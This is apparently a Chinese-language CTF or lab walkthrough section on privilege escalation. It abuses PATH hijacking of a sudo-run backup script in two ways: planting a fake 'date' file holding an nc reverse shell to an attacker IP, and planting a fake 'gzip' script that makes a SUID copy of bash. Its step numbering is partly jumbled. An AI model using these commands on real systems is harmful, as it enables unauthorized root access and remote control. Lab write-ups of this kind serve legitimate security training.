0x05 进行提权

  • 方法一

      分析/opt/scripts/access_backup.sh脚本，可以看到直接调用了一些命令，可能存在“路径注入漏洞。存在一个date变量，可以创建一个名字为date的文件，里面写着反弹shell，然后再设置环境变量，让access_backup.sh加载创建的date文件，由于access_backup.sh文件是以sudo运行的，这样就可以获取root的权限了。

(1):设置环境变量并创建反弹shell文件

在具有权限的目录(/tmp)中，然后为当前目录配置了环境变量$PATH并创建了包含nc命令的shell文件，以在端口1234上返回一个root权限。

#切换到/tmp目录cd /tmp#查看环境变量echo $PATH#添加临时环境变量export PATH=/tmp:$PATH#在/tmp目录下写一个date文件echo "/bin/nc 10.10.16.22 1234 -e /bin/bash" > date#赋予执行权chmod 777 date#执行脚本sudo /opt/scripts/access_backup.sh

(2):攻击主机上进行监听

(3):成功获取root权限

(4):使用python起一个终端

python -c 'import pty;pty.spawn("/bin/bash")'

(5):成功获取root的flag

  • 方法二

       可以看到有一个gzip解压的命令，可以创建一个gzip文件，文件中创建一个/bin/bash文件，并且给这个文件的所有者以suid权限，让这个文件可以以root执行，这样就可以获取一个root权限。

(1):编写脚本

#切换到/tmp目录cd /tmp#查看环境变量echo $PATH#添加临时环境变量export PATH=/tmp:$PATH#在/tmp目录下写一个gzip文件echo '#!/bin/bash' > gzipecho 'cp /bin/bash /tmp/shell' >> gzipecho 'chmod u+s /tmp/shell' >> gzip#查看该文件cat gzip#赋予执行权chmod 777 gzip

(2):获取权限

#执行脚本sudo /opt/scripts/access_backup.sh运行shell文件./shell -p

(3):查看flag

cat user.txt

(13):这个用户可以以sudo执行一个shell脚本，立马想到这个就是突破口，然后创建提权脚本

(14):由于可以看到有一个gzip解压的命令，可以创建一个gzip文件，文件中创建一个/bin/bash文件，并且给这个文件的所有者以suid权限，让这个文件可以以root执行，这样就可以获取一个root权限；或者由于存在一个date变量，可以创建一个名字为date的文件，里面写着反弹shell，然后再设置环境变量，让access_backup.sh加载创建的date文件，由于access_backup.sh文件是以sudo运行的，这样就可以获取root的权限了
